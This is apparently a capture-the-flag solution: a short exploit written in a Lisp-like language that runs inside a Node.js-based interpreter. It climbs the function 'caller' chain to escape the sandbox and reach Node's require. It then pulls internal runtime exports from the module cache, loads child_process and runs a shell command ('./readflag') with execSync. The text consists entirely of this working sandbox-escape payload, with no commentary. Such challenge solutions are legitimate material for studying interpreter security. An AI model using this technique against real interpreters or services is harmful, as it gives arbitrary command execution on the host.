(do
	(let lispEval (. (. do "caller") "caller"))
	(print lispEval)
	(print (. lispEval "caller"))
	(let require (. (. (. lispEval "caller") "arguments") 1))
	(let cache (. require "cache"))
	(let runtimeExports (. (. cache "/app/runtime.js") "exports"))
	(print runtimeExports)
	(let extendedScope (. runtimeExports "extendedScope"))
	(let extScope (extendedScope))
	(print extScope)
	(let j2l (. (. extScope "table") "j2l"))
	(print j2l)
	(let jrequire (j2l require))
	(let cp (jrequire "child_process"))
	(let jexecSync (j2l (. cp "execSync")))
	(print (jexecSync "./readflag" (object (list "encoding" "utf-8"))))
)

